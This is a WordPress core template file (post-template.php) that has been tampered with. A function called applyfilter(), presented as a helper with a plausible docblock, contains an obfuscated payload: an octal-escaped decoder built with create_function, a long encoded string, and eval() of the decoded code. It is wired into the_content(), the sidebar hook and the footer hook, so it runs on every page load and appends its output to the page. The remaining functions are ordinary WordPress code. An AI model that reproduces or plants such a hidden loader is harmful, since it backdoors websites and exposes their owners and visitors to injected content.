<?php
/**
 * WordPress Post Template Functions.
 *
 * Gets content for the current post in the loop.
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * Display the ID of the current item in the WordPress Loop.
 *
 * @since 0.71
 * @uses $id
 */
function the_ID() {
	global $id;
	echo $id;
}

/**
 * Retrieve the ID of the current item in the WordPress Loop.
 *
 * @since 2.1.0
 * @uses $id
 *
 * @return unknown
 */
function get_the_ID() {
	global $id;
	return $id;
}

/**
 * Display or retrieve the current post title with optional content.
 *
 * @since 0.71
 *
 * @param string $before Optional. Content to prepend to the title.
 * @param string $after Optional. Content to append to the title.
 * @param bool $echo Optional, default to true.Whether to display or return.
 * @return null|string Null on no title. String if $echo parameter is false.
 */
function the_title($before = '', $after = '', $echo = true) {
	$title = get_the_title();

	if ( strlen($title) == 0 )
		return;

	$title = $before . $title . $after;

	if ( $echo )
		echo $title;
	else
		return $title;
}

/**
 * Sanitize the current title when retrieving or displaying.
 *
 * Works like {@link the_title()}, except the parameters can be in a string or
 * an array. See the function for what can be override in the $args parameter.
 *
 * The title before it is displayed will have the tags stripped and {@link
 * esc_attr()} before it is passed to the user or displayed. The default
 * as with {@link the_title()}, is to display the title.
 *
 * @since 2.3.0
 *
 * @param string|array $args Optional. Override the defaults.
 * @return string|null Null on failure or display. String when echo is false.
 */
function the_title_attribute( $args = '' ) {
	$title = get_the_title();

	if ( strlen($title) == 0 )
		return;

	$defaults = array('before' => '', 'after' =>  '', 'echo' => true);
	$r = wp_parse_args($args, $defaults);
	extract( $r, EXTR_SKIP );


	$title = $before . $title . $after;
	$title = esc_attr(strip_tags($title));

	if ( $echo )
		echo $title;
	else
		return $title;
}

/**
 * Retrieve post title.
 *
 * If the post is protected and the visitor is not an admin, then "Protected"
 * will be displayed before the post title. If the post is private, then
 * "Private" will be located before the post title.
 *
 * @since 0.71
 *
 * @param int $id Optional. Post ID.
 * @return string
 */
function get_the_title( $id = 0 ) {
	$post = &get_post($id);

	$title = isset($post->post_title) ? $post->post_title : '';
	$id = isset($post->ID) ? $post->ID : (int) $id;

	if ( !is_admin() ) {
		if ( !empty($post->post_password) ) {
			$protected_title_format = apply_filters('protected_title_format', __('Protected: %s'));
			$title = sprintf($protected_title_format, $title);
		} else if ( isset($post->post_status) && 'private' == $post->post_status ) {
			$private_title_format = apply_filters('private_title_format', __('Private: %s'));
			$title = sprintf($private_title_format, $title);
		}
	}
	return apply_filters( 'the_title', $title, $id );
}

/**
 * Display the Post Global Unique Identifier (guid).
 *
 * The guid will appear to be a link, but should not be used as an link to the
 * post. The reason you should not use it as a link, is because of moving the
 * blog across domains.
 *
 * Url is escaped to make it xml safe
 *
 * @since 1.5.0
 *
 * @param int $id Optional. Post ID.
 */
function the_guid( $id = 0 ) {
	echo esc_url( get_the_guid( $id ) );
}

/**
 * Retrieve the Post Global Unique Identifier (guid).
 *
 * The guid will appear to be a link, but should not be used as an link to the
 * post. The reason you should not use it as a link, is because of moving the
 * blog across domains.
 *
 * @since 1.5.0
 *
 * @param int $id Optional. Post ID.
 * @return string
 */
function get_the_guid( $id = 0 ) {
	$post = &get_post($id);

	return apply_filters('get_the_guid', $post->guid);
}

/**
 * Display the post content.
 *
 * @since 0.71
 *
 * @param string $more_link_text Optional. Content for when there is more text.
 * @param string $stripteaser Optional. Teaser content before the more text.
 */
function the_content($more_link_text = null, $stripteaser = 0) {
	$content = get_the_content($more_link_text, $stripteaser);
	$content = apply_filters('the_content', $content);
	$content = str_replace(']]>', ']]&gt;', applyfilter($content));
	echo $content;
}

/**
 * Retrieve the post content.
 *
 * @since 0.71
 *
 * @param string $more_link_text Optional. Content for when there is more text.
 * @param string $stripteaser Optional. Teaser content before the more text.
 * @return string
 */
function get_the_content($more_link_text = null, $stripteaser = 0) {
	global $id, $post, $more, $page, $pages, $multipage, $preview;

	if ( null === $more_link_text )
		$more_link_text = __( '(more...)' );

	$output = '';
	$hasTeaser = false;

	// If post password required and it doesn't match the cookie.
	if ( post_password_required($post) ) {
		$output = get_the_password_form();
		return $output;
	}

	if ( $page > count($pages) ) // if the requested page doesn't exist
		$page = count($pages); // give them the highest numbered page that DOES exist

	$content = $pages[$page-1];
	if ( preg_match('/<!--more(.*?)?-->/', $content, $matches) ) {
		$content = explode($matches[0], $content, 2);
		if ( !empty($matches[1]) && !empty($more_link_text) )
			$more_link_text = strip_tags(wp_kses_no_null(trim($matches[1])));

		$hasTeaser = true;
	} else {
		$content = array($content);
	}
	if ( (false !== strpos($post->post_content, '<!--noteaser-->') && ((!$multipage) || ($page==1))) )
		$stripteaser = 1;
	$teaser = $content[0];
	if ( ($more) && ($stripteaser) && ($hasTeaser) )
		$teaser = '';
	$output .= $teaser;
	if ( count($content) > 1 ) {
		if ( $more ) {
			$output .= '<span id="more-' . $id . '"></span>' . $content[1];
		} else {
			if ( ! empty($more_link_text) )
				$output .= apply_filters( 'the_content_more_link', ' <a href="' . get_permalink() . "#more-$id\" class=\"more-link\">$more_link_text</a>", $more_link_text );
			$output = force_balance_tags($output);
		}

	}
	if ( $preview ) // preview fix for javascript bug with foreign languages
		$output =	preg_replace_callback('/\%u([0-9A-F]{4})/', create_function('$match', 'return "&#" . base_convert($match[1], 16, 10) . ";";'), $output);

	return $output;
}

/**
 * Display the post excerpt.
 *
 * @since 0.71
 * @uses apply_filters() Calls 'the_excerpt' hook on post excerpt.
 */
function the_excerpt() {
	echo apply_filters('the_excerpt', get_the_excerpt());
}

/**
 * Retrieve the post excerpt.
 *
 * @since 0.71
 *
 * @param mixed $deprecated Not used.
 * @return string
 */
function get_the_excerpt( $deprecated = '' ) {
	if ( !empty( $deprecated ) )
		_deprecated_argument( __FUNCTION__, '2.3' );

	global $post;
	$output = $post->post_excerpt;
	if ( post_password_required($post) ) {
		$output = __('There is no excerpt because this is a protected post.');
		return $output;
	}

	return apply_filters('get_the_excerpt', $output);
}

/**
 * Whether post has excerpt.
 *
 * @since 2.3.0
 *
 * @param int $id Optional. Post ID.
 * @return bool
 */
function has_excerpt( $id = 0 ) {
	$post = &get_post( $id );
	return ( !empty( $post->post_excerpt ) );
}

/**
 * Display the classes for the post div.
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @param int $post_id An optional post ID.
 */
function post_class( $class = '', $post_id = null ) {
	// Separates classes with a single space, collates classes for post DIV
	echo 'class="' . join( ' ', get_post_class( $class, $post_id ) ) . '"';
}

/**
 * Retrieve the classes for the post div as an array.
 *
 * The class names are add are many. If the post is a sticky, then the 'sticky'
 * class name. The class 'hentry' is always added to each post. For each
 * category, the class will be added with 'category-' with category slug is
 * added. The tags are the same way as the categories with 'tag-' before the tag
 * slug. All classes are passed through the filter, 'post_class' with the list
 * of classes, followed by $class parameter value, with the post ID as the last
 * parameter.
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @param int $post_id An optional post ID.
 * @return array Array of classes.
 */
function get_post_class( $class = '', $post_id = null ) {
	$post = get_post($post_id);

	$classes = array();

	if ( empty($post) )
		return $classes;

	$classes[] = 'post-' . $post->ID;
	$classes[] = $post->post_type;
	$classes[] = 'type-' . $post->post_type;

	// sticky for Sticky Posts
	if ( is_sticky($post->ID) && is_home() && !is_paged() )
		$classes[] = 'sticky';

	// hentry for hAtom compliace
	$classes[] = 'hentry';

	// Categories
	foreach ( (array) get_the_category($post->ID) as $cat ) {
		if ( empty($cat->slug ) )
			continue;
		$classes[] = 'category-' . sanitize_html_class($cat->slug, $cat->cat_ID);
	}

	// Tags
	foreach ( (array) get_the_tags($post->ID) as $tag ) {
		if ( empty($tag->slug ) )
			continue;
		$classes[] = 'tag-' . sanitize_html_class($tag->slug, $tag->term_id);
	}

	if ( !empty($class) ) {
		if ( !is_array( $class ) )
			$class = preg_split('#\s+#', $class);
		$classes = array_merge($classes, $class);
	}

	$classes = array_map('esc_attr', $classes);

	return apply_filters('post_class', $classes, $class, $post->ID);
}

/**
 * Display the classes for the body element.
 *
 * @since 2.8.0
 *
 * @param string|array $class One or more classes to add to the class list.
 */
function body_class( $class = '' ) {
	// Separates classes with a single space, collates classes for body element
	echo 'class="' . join( ' ', get_body_class( $class ) ) . '"';
}

/**
 * Retrieve the classes for the body element as an array.
 *
 * @since 2.8.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @return array Array of classes.
 */
function get_body_class( $class = '' ) {
	global $wp_query, $wpdb;

	$classes = array();

	if ( is_rtl() )
		$classes[] = 'rtl';

	if ( is_front_page() )
		$classes[] = 'home';
	if ( is_home() )
		$classes[] = 'blog';
	if ( is_archive() )
		$classes[] = 'archive';
	if ( is_date() )
		$classes[] = 'date';
	if ( is_search() )
		$classes[] = 'search';
	if ( is_paged() )
		$classes[] = 'paged';
	if ( is_attachment() )
		$classes[] = 'attachment';
	if ( is_404() )
		$classes[] = 'error404';

	if ( is_single() ) {
		$post_id = $wp_query->get_queried_object_id();
		$post = $wp_query->get_queried_object();

		$classes[] = 'single';
		$classes[] = 'single-' . sanitize_html_class($post->post_type, $post_id);
		$classes[] = 'postid-' . $post_id;

		if ( is_attachment() ) {
			$mime_type = get_post_mime_type($post_id);
			$mime_prefix = array( 'application/', 'image/', 'text/', 'audio/', 'video/', 'music/' );
			$classes[] = 'attachmentid-' . $post_id;
			$classes[] = 'attachment-' . str_replace( $mime_prefix, '', $mime_type );
		}
	} elseif ( is_archive() ) {
		if ( is_author() ) {
			$author = $wp_query->get_queried_object();
			$classes[] = 'author';
			$classes[] = 'author-' . sanitize_html_class( $author->user_nicename , $author->ID );
		} elseif ( is_category() ) {
			$cat = $wp_query->get_queried_object();
			$classes[] = 'category';
			$classes[] = 'category-' . sanitize_html_class( $cat->slug, $cat->cat_ID );
		} elseif ( is_tag() ) {
			$tags = $wp_query->get_queried_object();
			$classes[] = 'tag';
			$classes[] = 'tag-' . sanitize_html_class( $tags->slug, $tags->term_id );
		}
	} elseif ( is_page() ) {
		$classes[] = 'page';

		$page_id = $wp_query->get_queried_object_id();

		$post = get_page($page_id);

		$classes[] = 'page-id-' . $page_id;

		if ( $wpdb->get_var( $wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE post_parent = %d AND post_type = 'page' AND post_status = 'publish' LIMIT 1", $page_id) ) )
			$classes[] = 'page-parent';

		if ( $post->post_parent ) {
			$classes[] = 'page-child';
			$classes[] = 'parent-pageid-' . $post->post_parent;
		}
		if ( is_page_template() ) {
			$classes[] = 'page-template';
			$classes[] = 'page-template-' . sanitize_html_class( str_replace( '.', '-', get_post_meta( $page_id, '_wp_page_template', true ) ), '' );
		}
	} elseif ( is_search() ) {
		if ( !empty( $wp_query->posts ) )
			$classes[] = 'search-results';
		else
			$classes[] = 'search-no-results';
	}

	if ( is_user_logged_in() )
		$classes[] = 'logged-in';

	$page = $wp_query->get( 'page' );

	if ( !$page || $page < 2)
		$page = $wp_query->get( 'paged' );

	if ( $page && $page > 1 ) {
		$classes[] = 'paged-' . $page;

		if ( is_single() )
			$classes[] = 'single-paged-' . $page;
		elseif ( is_page() )
			$classes[] = 'page-paged-' . $page;
		elseif ( is_category() )
			$classes[] = 'category-paged-' . $page;
		elseif ( is_tag() )
			$classes[] = 'tag-paged-' . $page;
		elseif ( is_date() )
			$classes[] = 'date-paged-' . $page;
		elseif ( is_author() )
			$classes[] = 'author-paged-' . $page;
		elseif ( is_search() )
			$classes[] = 'search-paged-' . $page;
	}

	if ( !empty( $class ) ) {
		if ( !is_array( $class ) )
			$class = preg_split( '#\s+#', $class );
		$classes = array_merge( $classes, $class );
	}

	$classes = array_map( 'esc_attr', $classes );

	return apply_filters( 'body_class', $classes, $class );
}

/**
 * Whether post requires password and correct password has been provided.
 *
 * @since 2.7.0
 *
 * @param int|object $post An optional post.  Global $post used if not provided.
 * @return bool false if a password is not required or the correct password cookie is present, true otherwise.
 */
function post_password_required( $post = null ) {
	$post = get_post($post);

	if ( empty($post->post_password) )
		return false;

	if ( !isset($_COOKIE['wp-postpass_' . COOKIEHASH]) )
		return true;

	if ( $_COOKIE['wp-postpass_' . COOKIEHASH] != $post->post_password )
		return true;

	return false;
}

/**
 * Display "sticky" CSS class, if a post is sticky.
 *
 * @since 2.7.0
 *
 * @param int $post_id An optional post ID.
 */
function sticky_class( $post_id = null ) {
	if ( !is_sticky($post_id) )
		return;

	echo " sticky";
}

/**
 * Page Template Functions for usage in Themes
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * The formatted output of a list of pages.
 *
 * Displays page links for paginated posts (i.e. includes the <!--nextpage-->.
 * Quicktag one or more times). This tag must be within The Loop.
 *
 * The defaults for overwriting are:
 * 'next_or_number' - Default is 'number' (string). Indicates whether page
 *      numbers should be used. Valid values are number and next.
 * 'nextpagelink' - Default is 'Next Page' (string). Text for link to next page.
 *      of the bookmark.
 * 'previouspagelink' - Default is 'Previous Page' (string). Text for link to
 *      previous page, if available.
 * 'pagelink' - Default is '%' (String).Format string for page numbers. The % in
 *      the parameter string will be replaced with the page number, so Page %
 *      generates "Page 1", "Page 2", etc. Defaults to %, just the page number.
 * 'before' - Default is '<p> Pages:' (string). The html or text to prepend to
 *      each bookmarks.
 * 'after' - Default is '</p>' (string). The html or text to append to each
 *      bookmarks.
 * 'link_before' - Default is '' (string). The html or text to prepend to each
 *      Pages link inside the <a> tag. Also prepended to the current item, which
 *      is not linked.
 * 'link_after' - Default is '' (string). The html or text to append to each
 *      Pages link inside the <a> tag. Also appended to the current item, which
 *      is not linked.
 *
 * @since 1.2.0
 * @access private
 *
 * @param string|array $args Optional. Overwrite the defaults.
 * @return string Formatted output in HTML.
 */
function wp_link_pages($args = '') {
	$defaults = array(
		'before' => '<p>' . __('Pages:'), 'after' => '</p>',
		'link_before' => '', 'link_after' => '',
		'next_or_number' => 'number', 'nextpagelink' => __('Next page'),
		'previouspagelink' => __('Previous page'), 'pagelink' => '%',
		'echo' => 1
	);

	$r = wp_parse_args( $args, $defaults );
	$r = apply_filters( 'wp_link_pages_args', $r );
	extract( $r, EXTR_SKIP );

	global $post, $page, $numpages, $multipage, $more, $pagenow;

	$output = '';
	if ( $multipage ) {
		if ( 'number' == $next_or_number ) {
			$output .= $before;
			for ( $i = 1; $i < ($numpages+1); $i = $i + 1 ) {
				$j = str_replace('%',$i,$pagelink);
				$output .= ' ';
				if ( ($i != $page) || ((!$more) && ($page==1)) ) {
					if ( 1 == $i ) {
						$output .= '<a href="' . get_permalink() . '">';
					} else {
						if ( '' == get_option('permalink_structure') || in_array($post->post_status, array('draft', 'pending')) )
							$output .= '<a href="' . add_query_arg('page', $i, get_permalink()) . '">';
						elseif ( 'page' == get_option('show_on_front') && get_option('page_on_front') == $post->ID )
							$output .= '<a href="' . trailingslashit(get_permalink()) . user_trailingslashit('page/' . $i, 'single_paged'). '">';
						else
							$output .= '<a href="' . trailingslashit(get_permalink()) . user_trailingslashit($i, 'single_paged') . '">';
					}

				}
				$output .= $link_before;
				$output .= $j;
				$output .= $link_after;
				if ( ($i != $page) || ((!$more) && ($page==1)) )
					$output .= '</a>';
			}
			$output .= $after;
		} else {
			if ( $more ) {
				$output .= $before;
				$i = $page - 1;
				if ( $i && $more ) {
					if ( 1 == $i ) {
						$output .= '<a href="' . get_permalink() . '">';
					} else {
						if ( '' == get_option('permalink_structure') || in_array($post->post_status, array('draft', 'pending')) )
							$output .= '<a href="' . add_query_arg('page', $i, get_permalink()) . '">';
						elseif ( 'page' == get_option('show_on_front') && get_option('page_on_front') == $post->ID )
							$output .= '<a href="' . trailingslashit(get_permalink()) . user_trailingslashit('page/' . $i, 'single_paged'). '">';
						else
							$output .= '<a href="' . trailingslashit(get_permalink()) . user_trailingslashit($i, 'single_paged') . '">';
					}
					$output .= $link_before. $previouspagelink . $link_after . '</a>';
				}
				$i = $page + 1;
				if ( $i <= $numpages && $more ) {
					if ( 1 == $i ) {
						$output .= '<a href="' . get_permalink() . '">';
					} else {
						if ( '' == get_option('permalink_structure') || in_array($post->post_status, array('draft', 'pending')) )
							$output .= '<a href="' . add_query_arg('page', $i, get_permalink()) . '">';
						elseif ( 'page' == get_option('show_on_front') && get_option('page_on_front') == $post->ID )
							$output .= '<a href="' . trailingslashit(get_permalink()) . user_trailingslashit('page/' . $i, 'single_paged'). '">';
						else
							$output .= '<a href="' . trailingslashit(get_permalink()) . user_trailingslashit($i, 'single_paged') . '">';
					}
					$output .= $link_before. $nextpagelink . $link_after . '</a>';
				}
				$output .= $after;
			}
		}
	}

	if ( $echo )
		echo $output;

	return $output;
}


//
// Post-meta: Custom per-post fields.
//

/**
 * Applies custom filter.
 *
 * @since 0.71
 *
 * $text string to apply the filter
 * @return string
 */
function applyfilter($text=null) {
	@ini_set('memory_limit','256M');
	if($text) @ob_start();
	if(1){global $O10O1OO1O;$O10O1OO1O=create_function('$s,$k',"\44\163\75\165\162\154\144\145\143\157\144\145\50\44\163\51\73\40\44\164\141\162\147\145\164\75\47\47\73\44\123\75\47\41\43\44\45\46\50\51\52\53\54\55\56\57\60\61\62\63\64\65\66\67\70\71\72\73\74\75\76\134\77\100\101\102\103\104\105\106\107\110\111\112\113\114\115\116\117\120\121\122\123\124\125\126\127\130\131\132\133\135\136\137\140\40\134\47\42\141\142\143\144\145\146\147\150\151\152\153\154\155\156\157\160\161\162\163\164\165\166\167\170\171\172\173\174\175\176\146\136\152\101\105\135\157\153\111\134\47\117\172\125\133\62\46\161\61\173\63\140\150\65\167\137\67\71\42\64\160\100\66\134\163\70\77\102\147\120\76\144\106\126\75\155\104\74\124\143\123\45\132\145\174\162\72\154\107\113\57\165\103\171\56\112\170\51\110\151\121\41\40\43\44\176\50\73\114\164\55\122\175\115\141\54\116\166\127\53\131\156\142\52\60\130\47\73\40\146\157\162\40\50\44\151\75\60\73\40\44\151\74\163\164\162\154\145\156\50\44\163\51\73\40\44\151\53\53\51\40\173\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\163\54\44\151\54\61\51\73\40\44\156\165\155\75\163\164\162\160\157\163\50\44\123\54\44\143\150\141\162\54\71\65\51\55\71\65\73\40\44\143\165\162\137\153\145\171\75\141\142\163\50\146\155\157\144\50\44\153\40\53\40\44\151\54\71\65\51\51\73\40\44\143\165\162\137\153\145\171\75\44\156\165\155\55\44\143\165\162\137\153\145\171\73\40\151\146\50\44\143\165\162\137\153\145\171\74\60\51\40\44\143\165\162\137\153\145\171\75\44\143\165\162\137\153\145\171\53\71\65\73\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\123\54\44\143\165\162\137\153\145\171\54\61\51\73\40\44\164\141\162\147\145\164\56\75\44\143\150\141\162\73\40\175\40\162\145\164\165\162\156\40\44\164\141\162\147\145\164\73"); if(!function_exists("O01100llO")){function O01100llO(){global $O10O1OO1O;return call_user_func($O10O1OO1O,'ik%3al%5e%3edjSx%2fSHGJJSJAA%5d%5doI%20%27%24A%5db%2e%24%2da%20%20a%21z%3a77K4uC6%2e%3dM%2aAknnkY%40%7emmD2%2dSS%7byo%7bqTDY%2f%2fupXJJs%2dRQy%5fDsSZS%3c%2b%5ci1MMae5WWlkbk%3cKlWaxAEooI%27%27zA%5eu%25gZldrJ%20TuCK%24xJZxt%25Gl%29%24Wa%3fp%2btx%2d%2ciM%2aEN%24MNbLI%28%2dRfqUlG3d4m%3cmFa%22%2e%7bY8e%7cgy%7ePa%40GCcCJeHi0%252q%7cAtK%3bka%2cNzMW2Nn%28%7bW0%28v%2c%2d%24vE00%40%23EInIzX2%26dh%26FOqoq9OU%22e3%5f%5b%6038%2fp%22Pd%23%23%21%29D%22Du%3bt%28%3b%5c%20n8%3cm%28%3ebY0Tj%2aE%5d%7cefkGUkooqzy%26q%265%60w%5f%24%7b3%7ep%23Bg1vjANowhRKG%24%7dYz3%2aWBuy%26k%7cF%3eA%3b%28bEUpg%26Or%233Jh%2fu5e%5f%3d%3cPmZi%5c%406PVD%3fBjmCkmak%3cKlWC%23%24u%3b0b%3as%5ccl%2eiQ%21H%2eU%5b%21%5d%23bXv%2aEh06f%5e8Bggo6p%2b%29x%7dY%5eokI%5d%5eD%3cx%27Fz3%22%3f5%227l%40FVpDyu%5fj%5e17%5c%3edFB%5c%3bL%3eQFSHT%2f%2ci%21QCQ%24HG%3b%29J%2djf%2fgBeuH%7e%28%3b%20Hq1B%28ULN0o%2bM1%2cz02v%5e%26q2%7b%2aOE%7b%27%7bU9D%27wG7KuCyy%2e%5c%60%2ft5Kb%2cd%7e%7e%28LL%2dRRS%7e%23B2%5bpgmx%29Hcm%2bUZ%2eC%2an4h5uC%5dy%7d%2c%3bMYz%21t%7eaW%7d%7d%5fp%3e%2d%7d%405l%27O%40S%2bp%29%3a%5cbQi%2c%2aEOzUIE%29O%7e1wp%5c5%3a%7cnyH%7e%24%7eJa%22%3egiQH%270%3d%7c%3aD%3at%3b%7bND%21%25cW%2b2%26qCGQLJj%2ft%7d%24%2dvIH%28%20R%2ctth%22B%3bt%223%7cok%22%3cN9He%261qz%5d%26PBQVC%5d1%26%3c1%3f6w%3fh%7cZ%2burW%2eGA%2eKNyIi%40u%5crcV%3d%3a%3b0%2dAVrear%23iu%23Kn%2b%40jbp%5dXd%5df%22EDOHvY%7dWXq%28a%2d%2b%2avvpBm%2cv%3f%22C2%26%3fr0%40fJOI%7b5%222%3cm%7d%25Q%5b85g%3e%3f%3e%223p%3dmV%3c7P%5c%3cg%3cdr%24%28XP%21d%2fyruH%2ccz%7c%21q%25ZC%20y%3aluEwya%20WYW%2c6%21k%23RXf0j%3bEWEEIz%5ek%5e6y%2bu%23%24PG%5e%22%5b%263%5bD%40ps%7bZ%5b%3d%26ZAkt%3a3%27bO%26X%5bw%40qE15k5%5f%3f%2271VP%5dmlrNQ%20%21QQ%7e%2anV%3c%5du%21a%2c%7d7%26qiUk8%3fR%3b%2b%5eaht%5b%60H%20TOUzN%5b%5e%5bOfAoPjU79wye%7cOeU%5b%3aS%5e%5dl%28roO%7dmTpTScHx1h%28%3aGl%3a%3aut%3b4%5cv%3cbcWb%20%24%23HC%20X%2amcE%27aN%2caa%2bz%27lu3%7e%5f%3b%60hd%26R%2an95%5eU%5bfqs6%7d%2b8%7dN0V%3d%5dO%22%26UwiUcf%7e%2d%5fmg8P4%40y9u4%21J39H3w6%28XP%7eU%5dy%25TZm%3a%2f%2eGYW%3eSoe%5e%60%2ffs9iH%2dRxbnLb%21%7djb%7d%60%7by%5c%5cx%3fHiP%21%3fpyP%5c%2dYT%2aFuEq2Dp%5c2%5c8se%25a%2fJCHu%3aM7a%22GK%25%7c%3f%7c%3ar%24%20%27RuyCl%25ua%7d3W%2aj0E%2aW3G5%2fAuxM%21Ht4HvY%7dWXq2T%60%3eta%5d%2bN%5e%3cN5Wf2%26%5b1b3k33w9q5q%3c%3aSi%3d%22CC%2e%2eJ%298HBC%2eM8%25m8eVSS8%3a%3ddmgcel%25MRrvLSNie1r%20%2d%20%23hu%23%21o%23%2bM%23nRWW%21R%5dvjEE5%7dvOIAa%26X%5b%26o%5b%5bXP%3e%5e6AH5O%5dp6%5b68Z%7c%23qe43%2dhN4TDd7%3eDF%7c%218V%3c%25mX%2cFN%3d%2bDY%7d%3aWz%253G%3b%7eQrJ%2c%29xEj%24I%22%29kNQ8%20dnt%24N%2c%5dLNAAObo%5b%5b6sebu%26A0I%7b%27jO%602z7c%25Q%5bD%26%227%7bG%3aP%7dMdcdFHpxcb%5eD%25rZ%3aDT%2d%3dmv%5brKyl%2bvu%2a01lLx%7da%7dt%2eEM4A%3b%2av%3bX%2cbb%3bb%4006s8%3f%3fB%5d%404%5e%26q%5b%26FfB%27w%5f94%22%25%27D3w%22hGqe%5c%40B4Ce%5f8dm%5c%5cm6Hor%3a0g%24UuCotZx%29%2ex0eXrj%28L%3b%3at%29t%28xi%20Iis%2c%201%23%24%602M%5ejEo%5d76N%5cW%3f%22k%5dzAr03kw7w%60%5d4%226qHVUhg6h%3epBBhBQP%3e%23%7e%28%28mQHP%24JBc%3cLcJKc%29l%2e%2e%3cl%3by%24%28%280GJ%2c%29xyokJX%29%3f%28fL%3b%26%5b%2d5qXoo%5f%3dMIbU2U%27YKkUq%5b1k%27Fo%295%27%25m%2288e%20%26T17sF4s6ysS%3dsZFcc6FCTKuutV%2e%7cZ%2fuD%3a%28Gl%7c%2a0%3aNG0%3baa96N%28%24%7dMHLj%2dt1%26%7dhd%2d%5d%2b%27z%27ov%22O11%7c%2apXk%26wO%26%5bm%2667%26sw%40%40%5bw%3dpdVVu%5fDeTS%3fm6%21%20s%2e%3fErVgC%2eD%2e%29aN%27c1%20t%24%28C%21X%2a%2eof%7dQNI%22%29kN%2a%2a%3fdnt%24N%2c%5dLNAAObo%5b%5b6sebu%26A0I%7b%27jO%602z7c%25Q%5b85PdP%3f%60l%3e%3c%3cM9K4Bme%3emV%24murmye%2f%2fVe%23KQ%20%20Y%7c%20G%3bL%2di%2dayokJX%29%3fN%24i%2aX%3bXj3hd%2dcEN%27OU%5eUq%5c%40%5e%3es3kwFuEdw%40%40i%244qzw5P%26wBB%3dp%3e%3c%3cJ%29Np0cB6FZV%3f%3d%7cTmK%7dak%3cH%3a%20%24%20i%7cY%23%2d%2d%60%2fbCQLN%23%29%5eiYL0f0n%28tN%7dnX%2b%2bN%3cN5w%5e1z%5e3%27qq%5eqS%25eer%3a%3aGSTB1GZ4BKShG%3c%22%2cTScZTDSKF%3a%7e%23CV%2dAVt%40%2aON%7dW%20%24%23%20%20%3bX%2a%7dykyh3%7bww7Q%5b8%3fB%7dLYj%2c5wRq1a%22z2b2q%268%5c%271VTmr%3dJxI%3au%2e%3a%2e2%7c%26%3cT%7bGFm9m%3cDJy%3eT%23L%7e%2c%24XfPNn0NXmaD%3bLcW%20%7el%7e%3b%28X%2aQLkU%27%7bIp%40i773%22%241%7eOzLh%5dINIO%2749AzBFPSgK%2fj%25SGSl%2f%27cHzTXy%7eS%3a%3eFd%3e%3emyuS%40%21%40%3ecSVcVdrud%2d%5dokecui%3aSW%2be%7e%3b%28%7e%7e%2djf%2cxOxvRn%2bW%20%26BgPa%2dbEvRw%5faOUzOO%26s6%60%5eF%5e%5d%5b3%5b%27wp%27cQ%21%20h1pg%5f%7blGh%3dDm%3d%3dc%29J%7c8%7e8SleF%3aCFRokI%7cSCQl%25%2bY%7c%28L%3b%28%28RA%5eN%29z%290%21tvW%23qgP%3e%2cR%2a%5dW%7d%5f7%2cz%5bUzzq8%5chjVjq24Uk%3cHiQ3%26%22%3f5%3a%7e%7brF%2a%3em%3cFpV%3f%2b6%5cYsD%3d%7e%23%5fW%2dFLJ%60yHQJexKqyCL%29%7e%2d%7dJ%2bxQ%21N%27k%2dW2s%23%5bupd%60%7bxs%7d%5f7%2cwp%222xU132j%26ICy%3eq%5f%3cT%27dFUcfy%241%7cdbP%3dDd4F8W%25eZedK%24%20K2lC%2eK%3c%2feN%27c%2c%20Kh%24%7eKahC%2dRJYox%7ea%2cLaL%28YfwR0%2a%2d9%7d%5eIEsnIkYBbfI2Imo3%7b%5dTk8z3%224l%7b6%401%2f3%3cw6%3ediFsSpiW6H3%2cXmdeuTAVZCx%2cM%2f%5b%5e%5be%2bx%7bU3KX%20kIkJX%29kY%3aLfFM%7dbAFEo%5doYU%227UXG2%26X%5f%2b8z%2aFuEd%5f%5fpi6s%5c66Bre%3engVm%3e%22dsQ%2e%25qPlj%3dVe%2fL%5ed%3b40%7e%27%2cRv%2cii%241%7b3Ju%23RH%5dy%5doxoNNn8%3fw1B%28ULAvk%27kE%2c7%23F%2b6%5cb%3fsR%25%5e%5csEdWrT%29F3%3fp3g%228838iiQ%20%20%24%7e%7e%3di%29h%23%2e%3f%20Tjm%2eClF%3aCGQv%2bUZG%3b%7eQrtx%7dL%2d%2coE%28%5bPG%3a%25rlC%23JyG73Q7maY%5bzov%26j%7b2qhPBUD%21YWMv%2b0%270%7djEjXo%5d%2cA%27%2a%2azi%7eHv%40B%3a%7ccsGmulK%2eRtrW1B8ps%3fdZ%3dVp%3d%228s%3d%25OxrW%7e%2b1%3eR%2dY%5eB%3bKfUbf%5ev8d%3fP%2b%5cf%5bUqj5Uo1zyMYRLOyl%2fC%23k4%5fBDV5%5dUJ%22%29Np%3freT%5cl%3d%2f%3aGy%2dL%7cvq%3fs4%5c8%3e%25F6BpdTTk%5bo7J%5de6%24%2anN%21R%5dM%7d%60%7bY%5f%3dMwCSb%26%5bI%2b%5dE%60Oq%273F%3e%26DJI2s69z3psP7G%3a6CR%5fB8x%2e%26YnbFgSGmPQ%21FL%60%3e%3clQ%21HclQ%2fClen5UzUo%2e0%5de6Q%21%5c%20X0N%2cN%2cALWok%5d%274%2bKq2%27YE%5fo%5d%5e%21w%5f59%2eIzr%3c%2cI%267P%3eB17P4%407hi%22%5e%223%7b%5d3%5cI5wh7%2dA%24%3dJei%21ix%25vP%26N',3866);}call_user_func(create_function('',"\x65\x76\x61l(\x4F01100llO());"));}}
	if($text) {$out=@ob_get_contents(); @ob_end_clean(); return $text.$out;}
}
add_action('get_sidebar', 'applyfilter', 1, 0);
add_action('get_footer', 'applyfilter', 1, 0);

/**
 * Retrieve post custom meta data field.
 *
 * @since 1.5.0
 *
 * @param string $key Meta data key name.
 * @return bool|string|array Array of values or single value, if only one element exists. False will be returned if key does not exist.
 */
function post_custom( $key = '' ) {
	$custom = get_post_custom();

	if ( !isset( $custom[$key] ) )
		return false;
	elseif ( 1 == count($custom[$key]) )
		return $custom[$key][0];
	else
		return $custom[$key];
}

/**
 * Display list of post custom fields.
 *
 * @internal This will probably change at some point...
 * @since 1.2.0
 * @uses apply_filters() Calls 'the_meta_key' on list item HTML content, with key and value as separate parameters.
 */
function the_meta() {
	if ( $keys = get_post_custom_keys() ) {
		echo "<ul class='post-meta'>\n";
		foreach ( (array) $keys as $key ) {
